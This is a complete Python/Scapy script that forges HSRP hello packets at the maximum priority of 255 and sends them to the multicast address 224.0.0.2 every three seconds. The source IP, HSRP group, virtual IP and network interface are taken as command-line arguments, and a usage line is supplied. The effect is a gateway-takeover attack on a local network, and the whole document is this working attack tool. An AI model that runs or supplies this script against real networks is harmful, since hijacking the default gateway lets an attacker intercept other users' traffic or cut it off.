from scapy.all import *
from argparse import ArgumentParser

parser=ArgumentParser()
parser.add_argument('--src','-src', help='Source IP Address')
parser.add_argument('--group','-grp', help='HSRP Group No.')
parser.add_argument('--virtualIP','-vip', help='Virtual IP Address')
parser.add_argument('--iface','-int', help='Interface')
parser.epilog="Usage: sudo python3 hsrp.py -src 10.0.0.10 -grp 1 -vip 10.0.0.1 -int eth0"
args=parser.parse_args()
if args.src is not None:
   if args.group is not None:
      if args.virtualIP is not None:
             if args.iface is not None:
                 ip = IP(src=args.src, dst='224.0.0.2')
                 udp = UDP(sport=1985,dport=1985)
                 hsrp = HSRP(group=int(args.group),priority=255,virtualIP=args.virtualIP)
                 send(ip/udp/hsrp, iface=args.iface, inter=3, loop=1)
             else:
                  exit()   
      else:
          exit()   
   else:
        exit()
else:
    exit()


